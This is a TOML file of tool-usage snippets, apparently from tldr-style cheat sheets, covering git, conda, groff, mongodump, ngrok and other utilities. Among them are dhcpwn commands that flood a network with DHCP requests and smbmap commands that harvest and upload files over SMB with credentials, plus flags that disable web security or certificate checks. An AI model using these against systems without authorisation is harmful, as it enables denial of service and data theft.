[[snippets]]
  description = "Render a man page using the ASCII output device, and display it using a pager"
  command = "groff -man -T ascii <path/to/manpage.1> | less --RAW-CONTROL-CHARS"
  output = ""

[[snippets]]
  description = "Render a man page into an HTML file"
  command = "groff -man -T html <path/to/manpage.1> > <path/to/manpage.html>"
  output = ""

[[snippets]]
  description = "Typeset a roff file containing [t]ables and [p]ictures, using the [me] macro set, to PDF, saving the output"
  command = "groff <-t> <-p> -<me> -T <pdf> <path/to/input.me> > <path/to/output.pdf>"
  output = ""

[[snippets]]
  description = "Run a `groff` command with preprocessor and macro options guessed by the `grog` utility"
  command = "eval ""$(grog -T utf8 <path/to/input.me>)"""
  output = ""

[[snippets]]
  description = "Search entries"
  command = "keepassxc-cli search <path/to/database_file> <name>"
  output = ""

[[snippets]]
  description = "List the contents of a folder"
  command = "keepassxc-cli ls <path/to/database_file> </path/to/directory>"
  output = ""

[[snippets]]
  description = "Add an entry with an auto-generated password"
  command = "keepassxc-cli add --generate <path/to/database_file> <entry_name>"
  output = ""

[[snippets]]
  description = "Delete an entry"
  command = "keepassxc-cli rm <path/to/database_file> <entry_name>"
  output = ""

[[snippets]]
  description = "Copy an entry's password to the clipboard"
  command = "keepassxc-cli clip <path/to/database_file> <entry_name>"
  output = ""

[[snippets]]
  description = "Copy a TOTP code to the clipboard"
  command = "keepassxc-cli clip --totp <path/to/database_file> <entry_name>"
  output = ""

[[snippets]]
  description = "Generate a passphrase with 7 words"
  command = "keepassxc-cli diceware --words <7>"
  output = ""

[[snippets]]
  description = "Generate a password with 16 printable ASCII characters"
  command = "keepassxc-cli generate --lower --upper --numeric --special --length <16>"
  output = ""

[[snippets]]
  description = "Launch CopyQ to store clipboard history"
  command = "copyq"
  output = ""

[[snippets]]
  description = "Show current clipboard content"
  command = "copyq clipboard"
  output = ""

[[snippets]]
  description = "Insert raw text into the clipboard history"
  command = "copyq add -- <text1> <text2> <text3>"
  output = ""

[[snippets]]
  description = "Insert text containing escape sequences ('\n', '\t') into the clipboard history"
  command = "copyq add <firstline\nsecondline>"
  output = ""

[[snippets]]
  description = "Print the content of the first 3 items in the clipboard history"
  command = "copyq read 0 1 2"
  output = ""

[[snippets]]
  description = "Copy a file's contents into the clipboard"
  command = "copyq copy < <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Copy a JPEG image into the clipboard"
  command = "copyq copy image/jpeg < <path/to/image.jpg>"
  output = ""

[[snippets]]
  description = "Display an annotated skeleton configuration XML file"
  command = "phpdox --skel"
  output = ""

[[snippets]]
  description = "Generate documentation for the current working directory"
  command = "phpdox"
  output = ""

[[snippets]]
  description = "Generate documentation using a specific configuration file"
  command = "phpdox --file <path/to/phpdox.xml>"
  output = ""

[[snippets]]
  description = "Only run the metadata collection process"
  command = "phpdox --collector"
  output = ""

[[snippets]]
  description = "Only run the documentation generator process"
  command = "phpdox --generator"
  output = ""

[[snippets]]
  description = "Convert a MacPaint file into a PGM image"
  command = "macptopbm <path/to/file.macp> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Skip over a specified number of bytes when reading the file"
  command = "macptopbm -extraskip <N> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Suppress all informational messages"
  command = "macptopbm -quiet > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "macptopbm -version"
  output = ""

[[snippets]]
  description = "Display changes in a histogram"
  command = "diff <path/to/file1> <path/to/file2> | diffstat"
  output = ""

[[snippets]]
  description = "Display inserted, deleted and modified changes as a table"
  command = "diff <path/to/file1> <path/to/file2> | diffstat -t"
  output = ""

[[snippets]]
  description = "Restore an unstaged file to the version of the current commit (HEAD)"
  command = "git restore <path/to/file>"
  output = ""

[[snippets]]
  description = "Restore an unstaged file to the version of a specific commit"
  command = "git restore --source <commit> <path/to/file>"
  output = ""

[[snippets]]
  description = "Discard all unstaged changes to tracked files"
  command = "git restore :/"
  output = ""

[[snippets]]
  description = "Unstage a file"
  command = "git restore --staged <path/to/file>"
  output = ""

[[snippets]]
  description = "Unstage all files"
  command = "git restore --staged :/"
  output = ""

[[snippets]]
  description = "Discard all changes to files, both staged and unstaged"
  command = "git restore --worktree --staged :/"
  output = ""

[[snippets]]
  description = "Interactively select sections of files to restore"
  command = "git restore --patch"
  output = ""

[[snippets]]
  description = "Pretend that a modified file is unchanged (`git status` will not show this as changed)"
  command = "git update-index --skip-worktree <path/to/modified_file>"
  output = ""

[[snippets]]
  description = "Test if a given variable is equal to a given string"
  command = "test ""<$MY_VAR>"" = ""</bin/zsh>"""
  output = ""

[[snippets]]
  description = "Test if a given variable is empty"
  command = "test -z ""<$GIT_BRANCH>"""
  output = ""

[[snippets]]
  description = "Test if a file exists"
  command = "test -f ""<path/to/file_or_directory>"""
  output = ""

[[snippets]]
  description = "Test if a directory does not exist"
  command = "test ! -d ""<path/to/directory>"""
  output = ""

[[snippets]]
  description = "If A is true, then do B, or C in the case of an error (notice that C may run even if A fails)"
  command = "test <condition> && <echo ""true""> || <echo ""false"">"
  output = ""

[[snippets]]
  description = "Run a `doctl databases user` command with an access token"
  command = "doctl databases user <command> --access-token <access_token>"
  output = ""

[[snippets]]
  description = "Retrieve details about a database user"
  command = "doctl databases user get <database_id> <user_name>"
  output = ""

[[snippets]]
  description = "Retrieve a list of database users for a given database"
  command = "doctl databases user list <database_id>"
  output = ""

[[snippets]]
  description = "Reset the auth password for a given user"
  command = "doctl databases user reset <database id> <user_name>"
  output = ""

[[snippets]]
  description = "Reset the MySQL auth plugn for a given user"
  command = "doctl databases user reset <database_id> <user_name> <caching_sha2_password|mysql_native_password>"
  output = ""

[[snippets]]
  description = "Create a user in the given database with a given username"
  command = "doctl databases user create <database_id> <user_name>"
  output = ""

[[snippets]]
  description = "Delete a user from the given database with the given username"
  command = "doctl databases user delete <database_id> <user_name>"
  output = ""

[[snippets]]
  description = "Register a machine with the Tarsnap server"
  command = "sudo tarsnap-keygen --keyfile <path/to/file.key> --user <user_email> --machine <machine_name>"
  output = ""

[[snippets]]
  description = "Encrypt the key file (a passphrase will be requested twice)"
  command = "sudo tarsnap-keygen --keyfile <path/to/file.key> --user <user_email> --machine <machine_name> --passphrased"
  output = ""

[[snippets]]
  description = "Create a new environment, installing named packages into it"
  command = "conda create --name <environment_name> <python=3.9 matplotlib>"
  output = ""

[[snippets]]
  description = "List all environments"
  command = "conda info --envs"
  output = ""

[[snippets]]
  description = "Load an environment"
  command = "conda activate <environment_name>"
  output = ""

[[snippets]]
  description = "Unload an environment"
  command = "conda deactivate"
  output = ""

[[snippets]]
  description = "Delete an environment (remove all packages)"
  command = "conda remove --name <environment_name> --all"
  output = ""

[[snippets]]
  description = "Install packages into the current environment"
  command = "conda install <python=3.4 numpy>"
  output = ""

[[snippets]]
  description = "List currently installed packages in current environment"
  command = "conda list"
  output = ""

[[snippets]]
  description = "Delete unused packages and caches"
  command = "conda clean --all"
  output = ""

[[snippets]]
  description = "Create a new directory with the specified branch checked out into it"
  command = "git worktree add <path/to/directory> <branch>"
  output = ""

[[snippets]]
  description = "Create a new directory with a new branch checked out into it"
  command = "git worktree add <path/to/directory> -b <new_branch>"
  output = ""

[[snippets]]
  description = "List all the working directories attached to this repository"
  command = "git worktree list"
  output = ""

[[snippets]]
  description = "Remove a worktree (after deleting worktree directory)"
  command = "git worktree prune"
  output = ""

[[snippets]]
  description = "Create a dump of all databases (this will place the files inside a directory called "dump")"
  command = "mongodump"
  output = ""

[[snippets]]
  description = "Specify an output location for the dump"
  command = "mongodump --out <path/to/directory>"
  output = ""

[[snippets]]
  description = "Create a dump of a given database"
  command = "mongodump --db <database_name>"
  output = ""

[[snippets]]
  description = "Create a dump of a given collection within a given database"
  command = "mongodump --collection <collection_name> --db <database_name>"
  output = ""

[[snippets]]
  description = "Connect to a given host running on a given port, and create a dump"
  command = "mongodump --host <host> --port <port>"
  output = ""

[[snippets]]
  description = "Create a dump of a given database with a given username; user will be prompted for password"
  command = "mongodump --username <username> <database> --password"
  output = ""

[[snippets]]
  description = "Create a dump from a specific instance; host, user, password and database will be defined in the connection string"
  command = "mongodump --uri <connection_string>"
  output = ""

[[snippets]]
  description = "Create a new scaffolded site, with SQLite as backend, in the `my-project` directory"
  command = "stack new <my-project> <yesod-sqlite>"
  output = ""

[[snippets]]
  description = "Install the Yesod CLI tool within a Yesod scaffolded site"
  command = "stack build yesod-bin cabal-install --install-ghc"
  output = ""

[[snippets]]
  description = "Start development server"
  command = "stack exec -- yesod devel"
  output = ""

[[snippets]]
  description = "Touch files with altered Template Haskell dependencies"
  command = "stack exec -- yesod touch"
  output = ""

[[snippets]]
  description = "Deploy application using Keter (Yesod's deployment manager)"
  command = "stack exec -- yesod keter"
  output = ""

[[snippets]]
  description = "Print current brightness and maximal brightness, shortened and separated by a slash"
  command = "ybacklight Sc/Sm"
  output = ""

[[snippets]]
  description = "Specify the brightness"
  command = "ybacklight s<420>"
  output = ""

[[snippets]]
  description = "Increase the brightness by 42 big steps (4200 by default)"
  command = "ybacklight Si42"
  output = ""

[[snippets]]
  description = "Decrease the brightness by 300"
  command = "ybacklight d300"
  output = ""

[[snippets]]
  description = "Perform a basic analysis check on the current project"
  command = "pio check"
  output = ""

[[snippets]]
  description = "Perform a basic analysis check on a specific project"
  command = "pio check --project-dir <project_dir>"
  output = ""

[[snippets]]
  description = "Perform an analysis check for a specific environment"
  command = "pio check --environment <environment>"
  output = ""

[[snippets]]
  description = "Perform an analysis check and only report a specified defect severity type"
  command = "pio check --severity <low|medium|high>"
  output = ""

[[snippets]]
  description = "Perform an analysis check and show detailed information when processing environments"
  command = "pio check --verbose"
  output = ""

[[snippets]]
  description = "List available boilerplates"
  command = "gibo list"
  output = ""

[[snippets]]
  description = "Write a boilerplate to `stdout`"
  command = "gibo dump <boilerplate>"
  output = ""

[[snippets]]
  description = "Write a boilerplate to .gitignore"
  command = "gibo dump <boilerplate> >><.gitignore>"
  output = ""

[[snippets]]
  description = "Search for boilerplates containing a given string"
  command = "gibo search <string>"
  output = ""

[[snippets]]
  description = "Update available local boilerplates"
  command = "gibo update"
  output = ""

[[snippets]]
  description = "Display current user's ID (UID), group ID (GID) and groups to which they belong"
  command = "id"
  output = ""

[[snippets]]
  description = "Display the current user identity as a number"
  command = "id -u"
  output = ""

[[snippets]]
  description = "Display the current group identity as a number"
  command = "id -g"
  output = ""

[[snippets]]
  description = "Display an arbitrary user's ID (UID), group ID (GID) and groups to which they belong"
  command = "id <username>"
  output = ""

[[snippets]]
  description = "Start the server and serve the rendered `README` file of a current directory"
  command = "grip"
  output = ""

[[snippets]]
  description = "Start the server and serve a specific Markdown file"
  command = "grip <path/to/file.md>"
  output = ""

[[snippets]]
  description = "Start the server and open the `README` file of the current directory in the browser"
  command = "grip --browser"
  output = ""

[[snippets]]
  description = "Start the server in the specified port and serve the rendered `README` file of the current directory"
  command = "grip <port>"
  output = ""

[[snippets]]
  description = "Page through a `gzip` compressed file with `less`"
  command = "zless <file.txt.gz>"
  output = ""

[[snippets]]
  description = "List all installed development platforms"
  command = "pio platform list"
  output = ""

[[snippets]]
  description = "Search for existing development platforms"
  command = "pio platform search <platform>"
  output = ""

[[snippets]]
  description = "Show details about a development platform"
  command = "pio platform show <platform>"
  output = ""

[[snippets]]
  description = "Install a development platform"
  command = "pio platform install <platform>"
  output = ""

[[snippets]]
  description = "Update installed development platforms"
  command = "pio platform update"
  output = ""

[[snippets]]
  description = "Uninstall a development platform"
  command = "pio platform uninstall <platform>"
  output = ""

[[snippets]]
  description = "List all supported frameworks"
  command = "pio platform frameworks"
  output = ""

[[snippets]]
  description = "Format a single file"
  command = "uncrustify -f <path/to/file.cpp> -o <path/to/output.cpp>"
  output = ""

[[snippets]]
  description = "Read filenames from `stdin`, and take backups before writing output back to the original filepaths"
  command = "find . -name ""*.cpp"" | uncrustify -F - --replace"
  output = ""

[[snippets]]
  description = "Don't make backups (useful if files are under version control)"
  command = "find . -name ""*.cpp"" | uncrustify -F - --no-backup"
  output = ""

[[snippets]]
  description = "Use a custom configuration file and write the result to `stdout`"
  command = "uncrustify -c <path/to/uncrustify.cfg> -f <path/to/file.cpp>"
  output = ""

[[snippets]]
  description = "Explicitly set a configuration variable's value"
  command = "uncrustify --set <option>=<value>"
  output = ""

[[snippets]]
  description = "Generate a new configuration file"
  command = "uncrustify --update-config -o <path/to/new.cfg>"
  output = ""

[[snippets]]
  description = "Generate a PPM image file as output for an Interleaf image file as input"
  command = "leaftoppm <path/to/file.pl>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "leaftoppm -version"
  output = ""

[[snippets]]
  description = "List each branch showing date, latest commit hash and message"
  command = "git brv"
  output = ""

[[snippets]]
  description = "Create an app"
  command = "doctl apps create"
  output = ""

[[snippets]]
  description = "Create a deployment for a specific app"
  command = "doctl apps create-deployment <app_id>"
  output = ""

[[snippets]]
  description = "Delete an app interactively"
  command = "doctl apps delete <app_id>"
  output = ""

[[snippets]]
  description = "Get an app"
  command = "doctl apps get"
  output = ""

[[snippets]]
  description = "List all apps"
  command = "doctl apps list"
  output = ""

[[snippets]]
  description = "List all deployments from a specific app"
  command = "doctl apps list-deployments <app_id>"
  output = ""

[[snippets]]
  description = "Get logs from a specific app"
  command = "doctl apps logs <app_id>"
  output = ""

[[snippets]]
  description = "Update a specific app with a given app spec"
  command = "doctl apps update <app_id> --spec <path/to/spec.yml>"
  output = ""

[[snippets]]
  description = "Generate font cache files"
  command = "fc-cache"
  output = ""

[[snippets]]
  description = "Force a rebuild of all font cache files, without checking if cache is up-to-date"
  command = "fc-cache -f"
  output = ""

[[snippets]]
  description = "Erase font cache files, then generate new font cache files"
  command = "fc-cache -r"
  output = ""

[[snippets]]
  description = "Print a secret to `stdout`"
  command = "secrethub read <path/to/secret>"
  output = ""

[[snippets]]
  description = "Generate a random value and store it as a new or updated secret"
  command = "secrethub generate <path/to/secret>"
  output = ""

[[snippets]]
  description = "Store a value from the clipboard as a new or updated secret"
  command = "secrethub write --clip <path/to/secret>"
  output = ""

[[snippets]]
  description = "Store a value supplied on `stdin` as a new or updated secret"
  command = "echo ""<secret_value>"" | secrethub write <path/to/secret>"
  output = ""

[[snippets]]
  description = "Audit a repository or secret"
  command = "secrethub audit <path/to/repo_or_secret>"
  output = ""

[[snippets]]
  description = "Let a steam locomotive run through your terminal"
  command = "sl"
  output = ""

[[snippets]]
  description = "The train burns, people scream"
  command = "sl -a"
  output = ""

[[snippets]]
  description = "Let the train fly"
  command = "sl -F"
  output = ""

[[snippets]]
  description = "Make the train little"
  command = "sl -l"
  output = ""

[[snippets]]
  description = "Let the user exit (CTRL + C)"
  command = "sl -e"
  output = ""

[[snippets]]
  description = "Enumerate hosts with NULL sessions enabled and open shares"
  command = "smbmap --host-file <path/to/file>"
  output = ""

[[snippets]]
  description = "Enumerate hosts and check SMB file permissions"
  command = "smbmap --host-file <path/to/file> -u <username> -p <password> -q"
  output = ""

[[snippets]]
  description = "Connect to an ip or hostname through smb using a username and password"
  command = "smbmap -u <username> -p <password> -d <domain> -H <ip_or_hostname>"
  output = ""

[[snippets]]
  description = "Locate and download files [R]ecursively up to N levels depth, searching for filename pattern (regex), and excluding certain shares"
  command = "smbmap --host-file <path/to/file> -u <username> -p <password> -q -R --depth <number> --exclude <sharename> -A <filepattern>"
  output = ""

[[snippets]]
  description = "Upload file through smb using username and password"
  command = "smbmap -u <username> -p <password> -d <domain> -H <ip_or_hostname> --upload <path/to/file> '</share_name/remote_filename>'"
  output = ""

[[snippets]]
  description = "Start `calc` in interactive mode"
  command = "calc"
  output = ""

[[snippets]]
  description = "Perform a calculation in non-interactive mode"
  command = "calc '<85 * (36 / 4)>'"
  output = ""

[[snippets]]
  description = "Don't format the output (for use with [p]ipes)"
  command = "calc -p '<4/3 * pi() * 5^3>'"
  output = ""

[[snippets]]
  description = "Perform a calculation and then switch to [i]nteractive mode"
  command = "calc -i '<sqrt(2)>'"
  output = ""

[[snippets]]
  description = "Start `calc` in a specific permission [m]ode (0 to 7, defaults to 7)"
  command = "calc -m <mode>"
  output = ""

[[snippets]]
  description = "View an introduction to `calc`"
  command = "calc help intro"
  output = ""

[[snippets]]
  description = "View an overview of `calc`"
  command = "calc help overview"
  output = ""

[[snippets]]
  description = "Open the `calc` manual"
  command = "calc help"
  output = ""

[[snippets]]
  description = "Create a cluster"
  command = "k3d cluster create <cluster_name>"
  output = ""

[[snippets]]
  description = "Delete a cluster"
  command = "k3d cluster delete <cluster_name>"
  output = ""

[[snippets]]
  description = "Create a new containerized k3s node"
  command = "k3d node create <node_name>"
  output = ""

[[snippets]]
  description = "Import an image from Docker into a k3d cluster"
  command = "k3d image import <image_name> --cluster <cluster_name>"
  output = ""

[[snippets]]
  description = "Create a new registry"
  command = "k3d registry create <registry_name>"
  output = ""

[[snippets]]
  description = "Bring up the default Hyperledger Fabric network"
  command = "minifab up -i <minifab_version>"
  output = ""

[[snippets]]
  description = "Bring down the Hyperledger Fabric network"
  command = "minifab down"
  output = ""

[[snippets]]
  description = "Install chaincode onto a specified channel"
  command = "minifab install -n <chaincode_name>"
  output = ""

[[snippets]]
  description = "Install a specific chaincode version onto a channel"
  command = "minifab install -n <chaincode_name> -v <chaincode_version>"
  output = ""

[[snippets]]
  description = "Initialize the chaincode after installation/upgrade"
  command = "minifab approve,commit,initialize,discover"
  output = ""

[[snippets]]
  description = "Invoke a chaincode method with the specified arguments"
  command = "minifab invoke -n <chaincode_name> -p '""<method_name>"", ""<argument1>"", ""<argument2>"", ...'"
  output = ""

[[snippets]]
  description = "Make a query on the ledger"
  command = "minifab blockquery <block_number>"
  output = ""

[[snippets]]
  description = "Quickly run an application"
  command = "minifab apprun -l <app_programming_language>"
  output = ""

[[snippets]]
  description = "Prepare the PHP extension in the current directory for compiling"
  command = "phpize"
  output = ""

[[snippets]]
  description = "Delete files previously created by phpize"
  command = "phpize --clean"
  output = ""

[[snippets]]
  description = "Auto-format a file or an entire directory"
  command = "stylua <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Check if a specific file has been formatted"
  command = "stylua --check <path/to/file>"
  output = ""

[[snippets]]
  description = "Run with a specific configuration file"
  command = "stylua --config-path <path/to/config_file> <path/to/file>"
  output = ""

[[snippets]]
  description = "Format code from `stdin` and output to `stdout`"
  command = "stylua - < <path/to/file.lua>"
  output = ""

[[snippets]]
  description = "Format a file or directory using spaces and preferring single quotes"
  command = "stylua --indent-type <Spaces> --quote-style <AutoPreferSingle> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Test if a given variable is equal/not equal to the specified string"
  command = "[[ $<variable> <==|!=> ""<string>"" ]]"
  output = ""

[[snippets]]
  description = "Test if a given string conforms the specified glob/regex"
  command = "[[ $<variable> <==|=~> <pattern> ]]"
  output = ""

[[snippets]]
  description = "Test if a given variable is [eq]ual/[n]ot [e]qual/[g]reater [t]han/[l]ess [t]han/[g]reater than or [e]qual/[l]ess than or [e]qual to the specified number"
  command = "[[ $<variable> -<eq|ne|gt|lt|ge|le> <integer> ]]"
  output = ""

[[snippets]]
  description = "Test if the specified variable has a [n]on-empty value"
  command = "[[ -n $<variable> ]]"
  output = ""

[[snippets]]
  description = "Test if the specified variable has an empty value"
  command = "[[ -z $<variable> ]]"
  output = ""

[[snippets]]
  description = "Test if the specified [f]ile exists"
  command = "[[ -f <path/to/file> ]]"
  output = ""

[[snippets]]
  description = "Test if the specified [d]irectory exists"
  command = "[[ -d <path/to/directory> ]]"
  output = ""

[[snippets]]
  description = "Test if the specified file or directory [e]xists"
  command = "[[ -e <path/to/file_or_directory> ]]"
  output = ""

[[snippets]]
  description = "Create the configuration file for a storage pool called pool_name using `/var/vms` as the underlying storage system"
  command = "virsh pool-define-as --name <pool_name> --type <dir> --target </var/vms>"
  output = ""

[[snippets]]
  description = "Run the default application in the flake in the current directory"
  command = "nix run"
  output = ""

[[snippets]]
  description = "Run a command whose name matches the package name from nixpkgs (if you want a different command from that package, see `tldr nix3 shell`)"
  command = "nix run nixpkgs#<pkg>"
  output = ""

[[snippets]]
  description = "Run a command with provided arguments"
  command = "nix run nixpkgs#<vim> -- <path/to/file>"
  output = ""

[[snippets]]
  description = "Run from a remote repository"
  command = "nix run <remote_name>:<owner>/<repo>"
  output = ""

[[snippets]]
  description = "Run from a remote repository using a specific tag, revision or branch"
  command = "nix run <remote_name>:<owner>/<repo>/<reference>"
  output = ""

[[snippets]]
  description = "Run from a remote repository specifying a subdirectory and a program"
  command = "nix run ""<remote_name>:<owner>/<repo>?dir=<dir_name>#<app>"""
  output = ""

[[snippets]]
  description = "Run the flake of a GitHub pull request"
  command = "nix run github:<owner>/<repo>/pull/<number>/head"
  output = ""

[[snippets]]
  description = "Open a specific URL or file"
  command = "chromium <https://example.com|path/to/file.html>"
  output = ""

[[snippets]]
  description = "Open in incognito mode"
  command = "chromium --incognito <example.com>"
  output = ""

[[snippets]]
  description = "Open in a new window"
  command = "chromium --new-window <example.com>"
  output = ""

[[snippets]]
  description = "Open in application mode (without toolbars, URL bar, buttons, etc.)"
  command = "chromium --app=<https://example.com>"
  output = ""

[[snippets]]
  description = "Use a proxy server"
  command = "chromium --proxy-server=""<socks5://hostname:66>"" <example.com>"
  output = ""

[[snippets]]
  description = "Open with a custom profile directory"
  command = "chromium --user-data-dir=<path/to/directory>"
  output = ""

[[snippets]]
  description = "Open without CORS validation (useful to test an API)"
  command = "chromium --user-data-dir=<path/to/directory> --disable-web-security"
  output = ""

[[snippets]]
  description = "Open with a DevTools window for each tab opened"
  command = "chromium --auto-open-devtools-for-tabs"
  output = ""

[[snippets]]
  description = "Use a specific base URL"
  command = "cotton -u <base_url> <path/to/file.md>"
  output = ""

[[snippets]]
  description = "Disable certificate verification (insecure mode)"
  command = "cotton -u <base_url> -i <path/to/file.md>"
  output = ""

[[snippets]]
  description = "Stop running when a test fails"
  command = "cotton -u <base_url> -s <path/to/file.md>"
  output = ""

[[snippets]]
  description = "Build a specific project"
  command = "nx build <project>"
  output = ""

[[snippets]]
  description = "Test a specific project"
  command = "nx test <project>"
  output = ""

[[snippets]]
  description = "Execute a target on a specific project"
  command = "nx run <project>:<target>"
  output = ""

[[snippets]]
  description = "Execute a target on multiple projects"
  command = "nx run-many --target <target> --projects <project1>,<project2>"
  output = ""

[[snippets]]
  description = "Execute a target on all projects in the workspace"
  command = "nx run-many --target <target> --all"
  output = ""

[[snippets]]
  description = "Execute a target only on projects that have been changed"
  command = "nx affected --target <target>"
  output = ""

[[snippets]]
  description = "Start the HTTP server serving the current directory with verbose output (listen on all interfaces and port 8000 by default)"
  command = "simplehttpserver -verbose"
  output = ""

[[snippets]]
  description = "Start the HTTP server with basic authentication serving a specific path over port 80 on all interfaces"
  command = "sudo simplehttpserver -basic-auth <username>:<password> -path </var/www/html> -listen 0.0.0.0:80"
  output = ""

[[snippets]]
  description = "Start the HTTP server, enabling HTTPS using a self-signed certificate with custom SAN on all interfaces"
  command = "sudo simplehttpserver -https -domain <*.selfsigned.com> -listen 0.0.0.0:443"
  output = ""

[[snippets]]
  description = "Start the HTTP server with custom response headers and upload capability"
  command = "simplehttpserver -upload -header '<X-Powered-By: Go>' -header '<Server: SimpleHTTPServer>'"
  output = ""

[[snippets]]
  description = "Start the HTTP server with customizable rules in YAML (see documentation for DSL)"
  command = "simplehttpserver -rules <rules.yaml>"
  output = ""

[[snippets]]
  description = "Open a file in write mode without parsing the file format headers"
  command = "radare2 -nw <path/to/binary>"
  output = ""

[[snippets]]
  description = "Debug a program"
  command = "radare2 -d <path/to/binary>"
  output = ""

[[snippets]]
  description = "Run a script before entering the interactive CLI"
  command = "radare2 -i <path/to/script.r2> <path/to/binary>"
  output = ""

[[snippets]]
  description = "Display help text for any command in the interactive CLI"
  command = "> <radare2_command>?"
  output = ""

[[snippets]]
  description = "Run a shell command from the interactive CLI"
  command = "> !<shell_command>"
  output = ""

[[snippets]]
  description = "Dump raw bytes of current block to a file"
  command = "> pr > <path/to/file.bin>"
  output = ""

[[snippets]]
  description = "Compile multiple source files into an executable"
  command = "gfortran <path/to/source1.f90 path/to/source2.f90 ...> -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Show common warnings, debug symbols in output, and optimize without affecting debugging"
  command = "gfortran <path/to/source.f90> -Wall -g -Og -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Include libraries from a different path"
  command = "gfortran <path/to/source.f90> -o <path/to/output_executable> -I<path/to/mod_and_include> -L<path/to/library> -l<library_name>"
  output = ""

[[snippets]]
  description = "Compile source code into Assembler instructions"
  command = "gfortran -S <path/to/source.f90>"
  output = ""

[[snippets]]
  description = "Compile source code into an object file without linking"
  command = "gfortran -c <path/to/source.f90>"
  output = ""

[[snippets]]
  description = "Merge all commits not present on the target branch from the source branch to target branch, and delete the source branch"
  command = "git graft <source_branch> <target_branch>"
  output = ""

[[snippets]]
  description = "Register a new PlatformIO account"
  command = "pio account register --username <username> --email <email> --password <password> --firstname <firstname> --lastname <lastname>"
  output = ""

[[snippets]]
  description = "Permanently delete your PlatformIO account and related data"
  command = "pio account destroy"
  output = ""

[[snippets]]
  description = "Log in to your PlatformIO account"
  command = "pio account login --username <username> --password <password>"
  output = ""

[[snippets]]
  description = "Log out of your PlatformIO account"
  command = "pio account logout"
  output = ""

[[snippets]]
  description = "Update your PlatformIO profile"
  command = "pio account update --username <username> --email <email> --firstname <firstname> --lastname <lastname> --current-password <password>"
  output = ""

[[snippets]]
  description = "Show detailed information about your PlatformIO account"
  command = "pio account show"
  output = ""

[[snippets]]
  description = "Reset your password using your username or email"
  command = "pio account forgot --username <username_or_email>"
  output = ""

[[snippets]]
  description = "Display all commit hashes and their corresponding commit messages from a specific author"
  command = "git contrib <author>"
  output = ""

[[snippets]]
  description = "List all supported operations (enabled operations are indicated with asterisks)"
  command = "virt-sysprep --list-operations"
  output = ""

[[snippets]]
  description = "Run all enabled operations but don't actually apply the changes"
  command = "virt-sysprep --domain <vm_name> --dry-run"
  output = ""

[[snippets]]
  description = "Run only the specified operations"
  command = "virt-sysprep --domain <vm_name> --operations <operation1,operation2,...>"
  output = ""

[[snippets]]
  description = "Generate a new `/etc/machine-id` file and enable customizations to be able to change the host name to avoid network conflicts"
  command = "virt-sysprep --domain <vm_name> --enable <customizations> --hostname <host_name> --operation <machine-id>"
  output = ""

[[snippets]]
  description = "Flood the network with IP requests"
  command = "dhcpwn --interface <network_interface> flood --count <number_of_requests>"
  output = ""

[[snippets]]
  description = "Sniff local DHCP traffic"
  command = "dhcpwn --interface <network_interface> sniff"
  output = ""

[[snippets]]
  description = "Traceroute to a host"
  command = "traceroute <example.com>"
  output = ""

[[snippets]]
  description = "Disable IP address and host name mapping"
  command = "traceroute -n <example.com>"
  output = ""

[[snippets]]
  description = "Specify wait time in seconds for response"
  command = "traceroute --wait=<0.5> <example.com>"
  output = ""

[[snippets]]
  description = "Specify number of queries per hop"
  command = "traceroute --queries=<5> <example.com>"
  output = ""

[[snippets]]
  description = "Specify size in bytes of probing packet"
  command = "traceroute <example.com> <42>"
  output = ""

[[snippets]]
  description = "Determine the MTU to the destination"
  command = "traceroute --mtu <example.com>"
  output = ""

[[snippets]]
  description = "Use ICMP instead of UDP for tracerouting"
  command = "traceroute --icmp <example.com>"
  output = ""

[[snippets]]
  description = "Execute a Puppet subcommand"
  command = "puppet <subcommand>"
  output = ""

[[snippets]]
  description = "Check the Puppet version"
  command = "puppet --version"
  output = ""

[[snippets]]
  description = "Display help"
  command = "puppet --help"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "puppet help <subcommand>"
  output = ""

[[snippets]]
  description = "Expose a local HTTP service on a given port"
  command = "ngrok http <80>"
  output = ""

[[snippets]]
  description = "Expose a local HTTP service on a specific host"
  command = "ngrok http <foo.dev>:<80>"
  output = ""

[[snippets]]
  description = "Expose a local HTTPS server"
  command = "ngrok http https://localhost"
  output = ""

[[snippets]]
  description = "Expose TCP traffic on a given port"
  command = "ngrok tcp <22>"
  output = ""

[[snippets]]
  description = "Expose TLS traffic for a specific host and port"
  command = "ngrok tls -hostname=<foo.com> <443>"
  output = ""

[[snippets]]
  description = "Calculate the SHA1 checksum for one or more files"
  command = "shasum <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Calculate the SHA256 checksum for one or more files"
  command = "shasum --algorithm 256 <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Calculate the SHA512 checksum for one or more files"
  command = "shasum --algorithm 512 <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Calculate a SHA1 checksum from `stdin`"
  command = "<command> | shasum"
  output = ""

[[snippets]]
  description = "Calculate and save the list of SHA256 checksums to a file"
  command = "shasum --algorithm 256 <path/to/file1 path/to/file2 ...> > <path/to/file.sha256>"
  output = ""

[[snippets]]
  description = "Read a file of SHA1 sums and filenames and verify all files have matching checksums"
  command = "shasum --check <path/to/file>"
  output = ""

[[snippets]]
  description = "Only show a message for missing files or when verification fails"
  command = "shasum --check --quiet <path/to/file>"
  output = ""

[[snippets]]
  description = "Only show a message when verification fails, ignoring missing files"
  command = "shasum --ignore-missing --check --quiet <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a single output file from an entry point file"
  command = "webpack <app.js> <bundle.js>"
  output = ""

[[snippets]]
  description = "Load CSS files too from the JavaScript file (this uses the CSS loader for `.css` files)"
  command = "webpack <app.js> <bundle.js> --module-bind '<css=css>'"
  output = ""

[[snippets]]
  description = "Pass a configuration file (with e.g. the entry script and the output filename) and show compilation progress"
  command = "webpack --config <webpack.config.js> --progress"
  output = ""

[[snippets]]
  description = "Automatically recompile on changes to project files"
  command = "webpack --watch <app.js> <bundle.js>"
  output = ""

[[snippets]]
  description = "Update the Maza database"
